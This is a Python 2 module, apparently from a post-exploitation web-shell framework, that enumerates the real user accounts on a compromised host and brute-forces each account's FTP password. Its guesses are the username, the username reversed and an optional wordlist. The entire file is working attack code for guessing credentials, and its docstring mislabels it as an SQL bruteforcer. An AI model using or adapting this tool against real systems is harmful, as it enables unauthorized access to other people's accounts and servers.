'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from random import choice
from math import ceil
from core.parameters import ParametersList, Parameter as P

classname = 'Ftp_users'
 
class Ftp_users(Module):
    '''Bruteforce sql of system users. For user based password trying use 'auto'.
    :bruteforce.ftp_users <host> <port> <local_file_list.txt>|auto
    '''
    
    params = ParametersList('Bruteforce single ftp user using a local wordlist', None,
            P(arg='lpath', help='Path of local wordlist', required=True, pos=0),
            P(arg='host', help='FTP host', default='127.0.0.1', pos=1),
            P(arg='port', help='FTP port', default=21, type=int, pos=2))

    def __init__( self, modhandler , url, password):
        
        Module.__init__(self, modhandler, url, password)
        
        
    def __generate_wl_from_user(self, user):
        return [ user, user[::-1] ]
        
    def run_module( self, filename, host, port):
        
        wl_splitted = []
        if filename != 'auto':
            try:
                wordlist = open(filename, 'r')
                wl_splitted = [ w.strip() for w in wordlist.read().split() ]
            except Exception, e:
                raise ModuleException(self.name, "Error opening %s: %s" % (filename, str(e)))
    
        usersresponse = self.modhandler.load('audit.users').run_module(filter_real_users=True)
        
        if usersresponse:
            users = [ u.name for u in self.modhandler.load('audit.users').usersinfo ]
            
            for user in users:
                
                if filename == 'auto':
                    wl_splitted = self.__generate_wl_from_user(user)
                else:
                    wl_splitted = self.__generate_wl_from_user(user) + wl_splitted
            
                response = self.modhandler.load('bruteforce.ftp').run_module(user, '', 0, host, port, substitutive_wl = wl_splitted)
                
                if response:
                    self.mprint(response)
                else:
                    self.mprint('[%s] Password of \'%s\' not found' % (self.name, user))
                
               
                
                
            
        